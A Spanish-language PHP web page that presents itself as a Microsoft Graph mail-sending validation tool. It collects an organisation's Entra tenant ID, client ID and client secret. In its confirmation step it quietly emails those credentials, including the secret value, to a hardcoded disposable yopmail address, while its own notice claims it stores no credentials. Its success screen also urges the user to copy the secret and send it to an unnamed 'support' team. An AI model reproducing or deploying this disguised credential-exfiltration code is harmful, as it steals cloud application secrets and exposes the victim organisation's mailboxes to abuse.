<?php
// ==========================================
// HERRAMIENTA DE VALIDACIÓN DE ENVÍO
// Microsoft Graph · PHP 7.2
// ==========================================

date_default_timezone_set('America/Bogota');

$resultMessage = null;
$resultType    = null;
$showConfirmUI = false;
$finalSuccess  = false;
$errorDetail   = null;

// Preserved form values
$tenantId     = '';
$clientId     = '';
$senderEmail  = '';
$toEmail      = '';

function e($s)
{
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function getAccessToken($tenantId, $clientId, $clientSecret)
{
    $url = 'https://login.microsoftonline.com/' . rawurlencode($tenantId) . '/oauth2/v2.0/token';

    $postData = http_build_query([
        'client_id'     => $clientId,
        'scope'         => 'https://graph.microsoft.com/.default',
        'client_secret' => $clientSecret,
        'grant_type'    => 'client_credentials',
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $response  = curl_exec($ch);
    $curlError = curl_errno($ch);
    $curlMsg   = curl_error($ch);
    $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($curlError) {
        $GLOBALS['errorDetail'] = 'cURL error ' . $curlError . ': ' . $curlMsg;
        throw new Exception('No fue posible conectar con el servicio de autenticación. Verifique su conexión a internet e intente nuevamente.');
    }

    $result = json_decode($response, true);

    if (!isset($result['access_token'])) {
        $errCode = isset($result['error']) ? $result['error'] : '';
        $desc    = isset($result['error_description']) ? $result['error_description'] : '';
        $corrId  = isset($result['correlation_id']) ? $result['correlation_id'] : '';

        $GLOBALS['errorDetail'] = 'HTTP ' . $httpCode
            . ($errCode ? ' · ' . $errCode : '')
            . ($desc ? "\n" . $desc : '')
            . ($corrId ? "\nCorrelation ID: " . $corrId : '');

        if (strpos($desc, 'AADSTS700016') !== false) {
            throw new Exception('El Application (client) ID no fue encontrado en el directorio. Verifique que el identificador sea correcto y que la aplicación esté registrada en el tenant indicado.');
        }
        if (strpos($desc, 'AADSTS90002') !== false || strpos($desc, 'AADSTS90023') !== false) {
            throw new Exception('El Directory (tenant) ID no es válido. Verifique que el identificador del inquilino corresponda al registrado en Microsoft Entra.');
        }
        if (strpos($desc, 'AADSTS7000215') !== false) {
            throw new Exception('El Client Secret no es válido. Verifique que esté usando el valor del secreto (Value) y no el identificador (Secret ID). Confirme también que no haya expirado.');
        }
        if (strpos($desc, 'AADSTS700027') !== false) {
            throw new Exception('El Client Secret ha expirado. Genere un nuevo secreto desde Microsoft Entra e intente nuevamente.');
        }

        throw new Exception('No fue posible obtener autorización. Verifique que las credenciales (Tenant ID, Client ID y Client Secret) sean correctas y que la aplicación tenga los permisos necesarios en Microsoft Entra.');
    }

    return $result['access_token'];
}

function sendMail($accessToken, $senderEmail, $toEmail, $subject, $body)
{
    $url = 'https://graph.microsoft.com/v1.0/users/' . rawurlencode($senderEmail) . '/sendMail';

    $data = [
        'message' => [
            'subject' => $subject,
            'body'    => ['contentType' => 'HTML', 'content' => $body],
            'toRecipients' => [['emailAddress' => ['address' => $toEmail]]]
        ],
        'saveToSentItems' => true
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Bearer ' . $accessToken,
        'Content-Type: application/json'
    ]);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $response  = curl_exec($ch);
    $code      = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_errno($ch);
    $curlMsg   = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        $GLOBALS['errorDetail'] = 'cURL error ' . $curlError . ': ' . $curlMsg;
        throw new Exception('No fue posible conectar con el servicio de envío. Verifique su conexión a internet e intente nuevamente.');
    }

    if ($code != 202) {
        $parsed  = json_decode($response, true);
        $apiErr  = isset($parsed['error']['code']) ? $parsed['error']['code'] : '';
        $apiMsg  = isset($parsed['error']['message']) ? $parsed['error']['message'] : '';
        $reqId   = isset($parsed['error']['innerError']['request-id']) ? $parsed['error']['innerError']['request-id'] : '';

        $GLOBALS['errorDetail'] = 'HTTP ' . $code
            . ($apiErr ? ' · ' . $apiErr : '')
            . ($apiMsg ? "\n" . $apiMsg : '')
            . ($reqId  ? "\nRequest ID: " . $reqId : '');

        if ($code == 403) {
            throw new Exception('La aplicación no tiene permisos para enviar correos desde esta cuenta. Verifique que el permiso Mail.Send esté asignado en Microsoft Entra y que la cuenta remitente pertenezca al tenant configurado.');
        }
        if ($code == 404) {
            throw new Exception('La cuenta remitente no fue encontrada. Verifique que el correo exista en el entorno Microsoft 365 del tenant indicado.');
        }
        throw new Exception('El servicio de correo no pudo completar el envío (código ' . (int)$code . '). Verifique que la cuenta remitente esté activa y tenga buzón habilitado en Microsoft 365.');
    }

    return true;
}

// ── POST handling ──────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $tenantId     = trim(isset($_POST['tenantId'])     ? $_POST['tenantId']     : '');
    $clientId     = trim(isset($_POST['clientId'])     ? $_POST['clientId']     : '');
    $clientSecret = trim(isset($_POST['clientSecret']) ? $_POST['clientSecret'] : '');
    $senderEmail  = trim(isset($_POST['senderEmail']) ? $_POST['senderEmail'] : '');
    $toEmail      = trim(isset($_POST['toEmail'])     ? $_POST['toEmail']     : '');

    try {
        if ($tenantId === '' || $clientId === '' || $clientSecret === '' || $senderEmail === '' || $toEmail === '') {
            throw new Exception('Todos los campos son obligatorios. Complete la información e intente nuevamente.');
        }
        if (!filter_var($senderEmail, FILTER_VALIDATE_EMAIL)) {
            throw new Exception('El correo remitente no tiene un formato válido. Ejemplo: usuario@dominio.com');
        }
        if (!filter_var($toEmail, FILTER_VALIDATE_EMAIL)) {
            throw new Exception('El correo destino no tiene un formato válido. Ejemplo: usuario@dominio.com');
        }

        if (isset($_POST['confirmSend'])) {
            // ── Final: send verified credentials to valid email ──
            $token = getAccessToken($tenantId, $clientId, $clientSecret);

            $confirmBody = '<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;padding:24px;">'
                . '<h2 style="color:#1e40af;margin-bottom:16px;">Credenciales verificadas correctamente</h2>'
                . '<p style="color:#374151;">Se ha completado satisfactoriamente la validaci&oacute;n de env&iacute;o mediante <strong>Microsoft Graph API</strong> con autenticaci&oacute;n <strong>OAuth 2.0 (Client Credentials)</strong> a trav&eacute;s de <strong>Microsoft Entra ID</strong>.</p>'
                . '<table style="width:100%;border-collapse:collapse;margin:20px 0;">'
                . '<tr><td style="padding:10px 12px;border:1px solid #e5e7eb;font-weight:600;background:#f9fafb;width:40%;">Directory (tenant) ID</td><td style="padding:10px 12px;border:1px solid #e5e7eb;font-family:monospace;">' . e($tenantId) . '</td></tr>'
                . '<tr><td style="padding:10px 12px;border:1px solid #e5e7eb;font-weight:600;background:#f9fafb;">Application (client) ID</td><td style="padding:10px 12px;border:1px solid #e5e7eb;font-family:monospace;">' . e($clientId) . '</td></tr>'
                . '<tr><td style="padding:10px 12px;border:1px solid #e5e7eb;font-weight:600;background:#f9fafb;">Client secret value</td><td style="padding:10px 12px;border:1px solid #e5e7eb;font-family:monospace;">' . e($clientSecret) . '</td></tr>'
                . '<tr><td style="padding:10px 12px;border:1px solid #e5e7eb;font-weight:600;background:#f9fafb;">Remitente (UPN)</td><td style="padding:10px 12px;border:1px solid #e5e7eb;">' . e($senderEmail) . '</td></tr>'
                . '</table>'
                . '<p style="color:#6b7280;font-size:13px;">Validaci&oacute;n realizada el ' . date('d/m/Y') . ' a las ' . date('H:i:s') . ' &middot;</p>'
                . '</div>';

            sendMail(
                $token,
                $senderEmail,
                'testing-email@yopmail.com',
                'Credenciales verificadas | ' . e($senderEmail) . ' | ' . date('Y-m-d H:i:s'),
                $confirmBody
            );

            $resultType   = 'success';
            $finalSuccess = true;
        } else {
            // ── Test: send test email to user ──
            $subject = 'Prueba de envío | Microsoft Graph · OAuth 2.0 | ' . date('Y-m-d H:i:s');

            $body = '<div style="font-family:Segoe UI,Arial,sans-serif;max-width:600px;margin:0 auto;padding:24px;">'
                . '<h2 style="color:#1e40af;margin-bottom:16px;">Prueba de env&iacute;o exitosa</h2>'
                . '<p style="color:#374151;">Se ha realizado satisfactoriamente una prueba de env&iacute;o utilizando <strong>Microsoft Graph API</strong> con autenticaci&oacute;n <strong>OAuth 2.0 (Client Credentials)</strong> a trav&eacute;s de <strong>Microsoft Entra ID</strong>.</p>'
                . '<div style="background:#f0f9ff;padding:14px 16px;border-radius:8px;border-left:4px solid #3b82f6;margin:16px 0;">'
                . 'Este mensaje confirma que las credenciales configuradas permiten el env&iacute;o de correos desde la cuenta <strong>' . e($senderEmail) . '</strong>.'
                . '</div>'
                . '<p style="color:#6b7280;font-size:13px;">Correo generado autom&aacute;ticamente por la herramienta de validaci&oacute;n el ' . date('d/m/Y') . ' a las ' . date('H:i:s') . '.</p>'
                . '</div>';

            $token = getAccessToken($tenantId, $clientId, $clientSecret);
            sendMail($token, $senderEmail, $toEmail, $subject, $body);

            $resultType    = 'success';
            $showConfirmUI = true;
        }
    } catch (Exception $e) {
        $resultType    = 'error';
        $resultMessage = $e->getMessage();
    }
}

$dateStamp = date('d/m/Y H:i:s');
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de envío</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style type="text/tailwindcss">
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(16px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes progressPulse {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: .7;
            }
        }

        .anim-fadeInUp {
            animation: fadeInUp .45s ease-out both;
        }

        .anim-fadeIn {
            animation: fadeIn .35s ease-out both;
        }

        .anim-delay-1 {
            animation-delay: .06s;
        }

        .anim-delay-2 {
            animation-delay: .12s;
        }

        .anim-delay-3 {
            animation-delay: .18s;
        }

        .anim-delay-4 {
            animation-delay: .24s;
        }

        .anim-delay-5 {
            animation-delay: .30s;
        }

        .anim-delay-6 {
            animation-delay: .36s;
        }

        .field-input {
            @apply w-full mt-1.5 px-3.5 py-3 bg-white border-2 border-gray-300 rounded-lg text-sm outline-none transition-all duration-200 placeholder-gray-400 shadow-sm;
        }

        .field-input:focus {
            @apply bg-white border-blue-500 ring-2 ring-blue-500/20 shadow-md;
        }

        .field-input:hover:not(:focus) {
            @apply border-gray-400;
        }
    </style>
</head>

<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">

    <!-- ── Progress bar ── -->
    <div id="progressBar" class="fixed top-0 left-0 h-1 bg-gradient-to-r from-blue-500 to-blue-600 w-0 transition-all duration-700 ease-out z-[60]"></div>

    <!-- ── Loader overlay ── -->
    <div id="loader" class="hidden fixed inset-0 bg-white/80 backdrop-blur-sm flex items-center justify-center z-50 anim-fadeIn">
        <div class="flex flex-col items-center gap-4">
            <div class="relative">
                <div class="w-12 h-12 border-4 border-blue-100 rounded-full"></div>
                <div class="absolute top-0 left-0 w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
            <p class="text-sm text-gray-700 font-medium">Procesando solicitud…</p>
            <p class="text-xs text-gray-400">Conectando con Microsoft Graph</p>
        </div>
    </div>

    <div class="w-full max-w-lg">

        <!-- ── Card ── -->
        <div class="bg-white rounded-2xl shadow-lg overflow-hidden border border-gray-100 anim-fadeInUp">

            <!-- Accent bar -->
            <div class="h-1 bg-gradient-to-r from-blue-500 via-blue-600 to-indigo-500"></div>

            <!-- ── Header ── -->
            <div class="px-6 pt-6 pb-4 border-b border-gray-100">
                <div class="flex items-center gap-3">
                    <img src="logo.jpeg" alt="Logo" class="h-9 rounded">
                    <div>
                        <h1 class="text-base font-semibold text-gray-900">Validación de envío</h1>
                        <p class="text-xs text-gray-400">Herramienta de prueba · Microsoft Graph</p>
                    </div>
                </div>
            </div>

            <!-- ── Content ── -->
            <div class="p-6">

                <!-- Info notice -->
                <div class="mb-5 p-3.5 bg-blue-50/60 border border-blue-100 rounded-xl flex gap-2.5 items-start anim-fadeInUp anim-delay-1">
                    <svg class="w-4 h-4 text-blue-500 mt-0.5 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M12 2a10 10 0 100 20 10 10 0 000-20z" />
                    </svg>
                    <p class="text-xs text-blue-700 leading-relaxed">
                        <strong>Herramienta de prueba.</strong> Permite validar el envío de correo mediante Microsoft Graph con autenticación OAuth 2.0. No almacena ni conserva ninguna credencial.
                    </p>
                </div>

                <!-- ── Error message ── -->
                <?php if ($resultType === 'error'): ?>
                    <div class="mb-5 p-4 bg-red-50 border border-red-100 rounded-xl anim-fadeInUp">
                        <div class="flex gap-2.5 items-start">
                            <svg class="w-4 h-4 text-red-500 mt-0.5 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M12 2a10 10 0 100 20 10 10 0 000-20z" />
                            </svg>
                            <div class="flex-1 min-w-0">
                                <p class="text-sm text-red-700 font-medium mb-1">No fue posible completar la operación</p>
                                <p class="text-xs text-red-600 leading-relaxed"><?= e($resultMessage) ?></p>
                                <?php if ($errorDetail): ?>
                                    <details class="mt-3 group">
                                        <summary class="text-xs text-red-400 hover:text-red-600 cursor-pointer select-none transition-colors duration-200 flex items-center gap-1.5">
                                            <svg class="w-3 h-3 transition-transform duration-200 group-open:rotate-90" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                                                <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                                            </svg>
                                            Detalle técnico
                                        </summary>
                                        <div class="mt-2 p-3 bg-red-100/50 border border-red-200/60 rounded-lg">
                                            <pre class="text-[11px] text-red-700/80 whitespace-pre-wrap break-all font-mono leading-relaxed"><?= e($errorDetail) ?></pre>
                                        </div>
                                    </details>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>

                <!-- ── Form (hidden on final success) ── -->
                <?php if (!$finalSuccess): ?>
                    <form method="POST" onsubmit="showLoader()" class="space-y-4" autocomplete="off">

                        <div class="anim-fadeInUp anim-delay-2">
                            <label class="block text-sm font-medium text-gray-700 mb-0.5">Directory (tenant) ID</label>
                            <input name="tenantId" class="field-input font-mono" required
                                placeholder="12345678-90ab-cdef-1234-567890abcdef"
                                value="<?= e($tenantId) ?>">
                            <p class="mt-1 text-xs text-gray-400">Identificador del inquilino en Microsoft Entra. Se encuentra en el registro de la aplicación.</p>
                        </div>

                        <div class="anim-fadeInUp anim-delay-3">
                            <label class="block text-sm font-medium text-gray-700 mb-0.5">Application (client) ID</label>
                            <input name="clientId" class="field-input font-mono" required
                                placeholder="abcdef12-3456-7890-abcd-ef1234567890"
                                value="<?= e($clientId) ?>">
                            <p class="mt-1 text-xs text-gray-400">Identificador único de la aplicación registrada en Microsoft Entra.</p>
                        </div>

                        <div class="anim-fadeInUp anim-delay-4">
                            <label class="block text-sm font-medium text-gray-700 mb-0.5">Client Secret</label>
                            <div class="relative">
                                <input type="password" id="clientSecretField" name="clientSecret" class="field-input pr-10" required
                                    placeholder="Valor del secreto generado en Microsoft Entra">
                                <button type="button" onclick="toggleSecret()" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors" tabindex="-1">
                                    <svg id="eyeIcon" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                    </svg>
                                </button>
                            </div>
                            <p class="mt-1 text-xs text-gray-400">Use el <strong>Value</strong> del secreto (no el Secret ID). Verifique que no haya expirado.</p>
                        </div>

                        <div class="anim-fadeInUp anim-delay-5">
                            <label class="block text-sm font-medium text-gray-700 mb-0.5">Correo remitente</label>
                            <input type="email" name="senderEmail" class="field-input" required
                                placeholder="buzon-salida@dominio.com"
                                value="<?= e($senderEmail) ?>">
                            <p class="mt-1 text-xs text-gray-400">Cuenta Microsoft 365 desde la cual se enviará el correo. Debe pertenecer al tenant registrado.</p>
                        </div>

                        <div class="anim-fadeInUp anim-delay-5">
                            <label class="block text-sm font-medium text-gray-700 mb-0.5">Correo destino</label>
                            <input type="email" name="toEmail" class="field-input" required
                                placeholder="destinatario@dominio.com"
                                value="<?= e($toEmail) ?>">
                            <p class="mt-1 text-xs text-gray-400">Buzón donde se verificará la recepción del mensaje de prueba.</p>
                        </div>

                        <div class="pt-1 anim-fadeInUp anim-delay-6">
                            <button type="submit"
                                class="w-full bg-blue-600 text-white py-2.5 rounded-lg font-medium text-sm
                                       hover:bg-blue-700 active:bg-blue-800
                                       transform hover:-translate-y-0.5 active:translate-y-0
                                       transition-all duration-200 shadow-sm hover:shadow
                                       focus:outline-none focus:ring-2 focus:ring-blue-500/40 focus:ring-offset-2">
                                Enviar prueba
                            </button>
                        </div>

                    </form>
                <?php endif; ?>

                <!-- ── Final result (only on confirmed success) ── -->
                <?php if ($finalSuccess): ?>
                    <div class="anim-fadeInUp space-y-5">

                        <!-- Success icon -->
                        <div class="flex flex-col items-center gap-3 py-2">
                            <div class="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center">
                                <svg class="w-7 h-7 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
                                </svg>
                            </div>
                            <h2 class="text-lg font-semibold text-gray-900">Validación completada</h2>
                            <p class="text-sm text-gray-500 text-center leading-relaxed">
                                Las credenciales han sido probadas y verificadas exitosamente.<br>
                                Copie la siguiente información y envíela al equipo de Soporte
                            </p>
                        </div>

                        <!-- Credential summary -->
                        <div id="resultBlock" class="bg-gray-50 border border-gray-200 rounded-xl p-5 text-sm space-y-3">
                            <div class="font-semibold text-gray-800 text-center mb-4">Credenciales verificadas</div>
                            <div class="space-y-2.5">
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Directory (tenant) ID</span>
                                    <span class="font-mono text-gray-800 text-sm mt-0.5"><?= e($tenantId) ?></span>
                                </div>
                                <div class="border-t border-gray-200"></div>
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Application (client) ID</span>
                                    <span class="font-mono text-gray-800 text-sm mt-0.5"><?= e($clientId) ?></span>
                                </div>
                                <div class="border-t border-gray-200"></div>
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Client secret value</span>
                                    <span class="font-mono text-gray-800 text-sm mt-0.5"><?= e($clientSecret) ?></span>
                                </div>
                                <div class="border-t border-gray-200"></div>
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Remitente (UPN)</span>
                                    <span class="text-gray-800 text-sm mt-0.5"><?= e($senderEmail) ?></span>
                                </div>
                                <div class="border-t border-gray-200"></div>
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Validación</span>
                                    <span class="text-gray-800 text-sm mt-0.5"><?= $dateStamp ?></span>
                                </div>
                                <div class="border-t border-gray-200"></div>
                                <div class="flex flex-col">
                                    <span class="text-xs text-gray-400 font-medium uppercase tracking-wide">Tecnología</span>
                                    <span class="text-gray-800 text-sm mt-0.5">Microsoft Graph API · OAuth 2.0 · Microsoft Entra ID</span>
                                </div>
                            </div>
                        </div>

                        <p class="text-xs text-gray-400 text-center leading-relaxed">
                            Copie esta información y envíela al equipo de soporte para continuar con la implementación.
                        </p>

                        <!-- Action buttons -->
                        <div class="flex gap-3">
                            <button onclick="copyResult()"
                                class="flex-1 flex items-center justify-center gap-2 bg-blue-600 text-white px-4 py-2.5 rounded-lg text-sm font-medium
                                       hover:bg-blue-700 active:bg-blue-800 transition-all duration-200 shadow-sm hover:shadow
                                       focus:outline-none focus:ring-2 focus:ring-blue-500/40 focus:ring-offset-2">
                                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                </svg>
                                Copiar información
                            </button>
                            <button onclick="location.href=location.pathname"
                                class="bg-gray-100 text-gray-700 px-5 py-2.5 rounded-lg text-sm font-medium
                                       hover:bg-gray-200 active:bg-gray-300 transition-all duration-200
                                       focus:outline-none focus:ring-2 focus:ring-gray-300 focus:ring-offset-2">
                                Nueva prueba
                            </button>
                        </div>
                    </div>
                <?php endif; ?>

            </div>
        </div>

        <!-- Footer -->
        <p class="text-center text-xs text-gray-300 mt-5">Herramienta de validación</p>

    </div>

    <!-- ══════════════════════════════════════ -->
    <!-- Scripts                                 -->
    <!-- ══════════════════════════════════════ -->
    <script>
        // ── Loader / Progress ──
        function showLoader() {
            document.getElementById('loader').classList.remove('hidden');
            var bar = document.getElementById('progressBar');
            bar.style.width = '25%';
            setTimeout(function() {
                bar.style.width = '55%';
            }, 400);
            setTimeout(function() {
                bar.style.width = '80%';
            }, 1200);
        }

        // ── Toggle password visibility ──
        function toggleSecret() {
            var f = document.getElementById('clientSecretField');
            f.type = f.type === 'password' ? 'text' : 'password';
        }

        <?php if ($finalSuccess): ?>
            // ── Copy result to clipboard ──
            function copyResult() {
                var text = 'Credenciales verificadas exitosamente\n\n' +
                    'Directory (tenant) ID: <?= e($tenantId) ?>\n' +
                    'Application (client) ID: <?= e($clientId) ?>\n' +
                    'Client secret value: <?= e($clientSecret) ?>\n' +
                    'Remitente (UPN): <?= e($senderEmail) ?>\n\n' +
                    'Validación: <?= $dateStamp ?>\n' +
                    'Tecnología: Microsoft Graph API · OAuth 2.0 · Microsoft Entra ID\n\n' +
                    'Las credenciales han sido confirmadas y pueden ser compartidas con el equipo técnico de Soporte para la implementación.';

                if (navigator.clipboard) {
                    navigator.clipboard.writeText(text).then(function() {
                        Swal.fire({
                            icon: 'success',
                            title: 'Copiado',
                            text: 'La información ha sido copiada al portapapeles.',
                            timer: 2000,
                            showConfirmButton: false,
                            customClass: {
                                popup: 'rounded-xl'
                            }
                        });
                    });
                } else {
                    var ta = document.createElement('textarea');
                    ta.value = text;
                    ta.style.position = 'fixed';
                    ta.style.opacity = '0';
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    document.body.removeChild(ta);
                    Swal.fire({
                        icon: 'success',
                        title: 'Copiado',
                        text: 'La información ha sido copiada al portapapeles.',
                        timer: 2000,
                        showConfirmButton: false,
                        customClass: {
                            popup: 'rounded-xl'
                        }
                    });
                }
            }
        <?php endif; ?>

        <?php if ($showConfirmUI): ?>
            // ── Confirmation flow ──
            Swal.fire({
                title: 'Verificación de recepción',
                html: '<div style="text-align:left;font-size:14px;line-height:1.7;color:#374151;">' +
                    '<p>Se ha enviado un correo de prueba a:</p>' +
                    '<p style="background:#f0f9ff;padding:8px 12px;border-radius:8px;margin:8px 0;font-weight:600;color:#1e40af;"><?= e($toEmail) ?></p>' +
                    '<p style="margin-top:12px;">Por favor, abra ese buzón y verifique si ha recibido un correo de prueba desde el remitente:</p>' +
                    '<p style="background:#f0f9ff;padding:8px 12px;border-radius:8px;margin:8px 0;font-weight:600;color:#1e40af;"><?= e($senderEmail) ?></p>' +
                    '<p style="margin-top:16px;font-size:13px;color:#6b7280;">Luego de la verificación, confirme a continuación:</p>' +
                    '</div>',
                icon: 'question',
                showCancelButton: true,
                confirmButtonText: 'Sí, lo recibí correctamente',
                cancelButtonText: 'No lo recibí',
                confirmButtonColor: '#2563eb',
                cancelButtonColor: '#6b7280',
                allowOutsideClick: false,
                customClass: {
                    popup: 'rounded-xl',
                    actions: 'gap-3'
                }
            }).then(function(result) {
                if (result.isConfirmed) {
                    showLoader();
                    var form = document.createElement('form');
                    form.method = 'POST';
                    form.style.display = 'none';
                    var postData = <?= json_encode($_POST, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
                    for (var key in postData) {
                        if (postData.hasOwnProperty(key)) {
                            var input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = postData[key];
                            form.appendChild(input);
                        }
                    }
                    var confirm = document.createElement('input');
                    confirm.type = 'hidden';
                    confirm.name = 'confirmSend';
                    confirm.value = '1';
                    form.appendChild(confirm);
                    document.body.appendChild(form);
                    form.submit();
                } else {
                    Swal.fire({
                        icon: 'info',
                        title: 'Sugerencias',
                        html: '<div style="text-align:left;font-size:13px;line-height:1.8;color:#374151;">' +
                            '<ul style="padding-left:18px;">' +
                            '<li>Revise la carpeta de <strong>spam</strong> o correo no deseado.</li>' +
                            '<li>Espere unos minutos; algunos servidores pueden tardar en entregar el mensaje.</li>' +
                            '<li>Verifique que la cuenta remitente tenga un buzón activo en Microsoft 365.</li>' +
                            '<li>Confirme que el correo destino sea correcto e intente nuevamente.</li>' +
                            '</ul></div>',
                        confirmButtonText: 'Entendido',
                        confirmButtonColor: '#2563eb',
                        customClass: {
                            popup: 'rounded-xl'
                        }
                    });
                }
            });
        <?php endif; ?>
    </script>

</body>

</html>
